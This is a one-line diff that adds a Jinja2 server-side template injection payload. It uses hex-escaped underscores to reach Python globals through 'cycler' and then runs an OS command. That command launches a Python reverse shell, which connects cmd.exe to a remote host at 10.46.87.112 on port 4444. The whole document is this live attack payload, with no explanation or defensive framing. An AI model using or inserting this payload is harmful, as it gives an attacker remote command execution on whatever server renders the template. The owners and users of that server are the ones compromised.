@@ -1,0 +1,1 @@
+{{ cycler['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f'].os.system('start py -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.46.87.112\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'cmd.exe\'],shell=True)"') }}
